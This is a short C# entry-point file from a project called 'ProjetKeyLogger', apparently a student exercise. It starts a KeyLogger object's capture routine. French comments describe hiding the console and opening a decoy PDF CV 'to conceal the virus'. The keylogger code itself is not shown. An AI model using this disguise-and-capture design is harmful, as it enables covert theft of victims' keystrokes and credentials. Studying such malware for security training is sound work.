using System;
using System.Linq;

namespace ProjetKeyLogger
{
    static class Program
    {
        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        static void Main()
        {
            //Ligne a supprimer la console ne devra surtout pas s'afficher une fois le progamme créé
           
            /*
            //Génere un document PDF pour dissimuler le virus
            var pdf = new Process();
            //Passe en parametre le chemin du document
            pdf.StartInfo = new ProcessStartInfo(@"C:/Users/Charlie/OneDrive/Etudes/M2 OPSIE/CV/CV_Camenen.pdf")
            {UseShellExecute = true};
            //Ouverture du pdf
            pdf.Start();*/

            //création de l'objet KeyLogger
            KeyLogger key_logger = new KeyLogger();
            key_logger.capture();
            //key_logger.CreateTestMessage2();
            
        }
    }
}
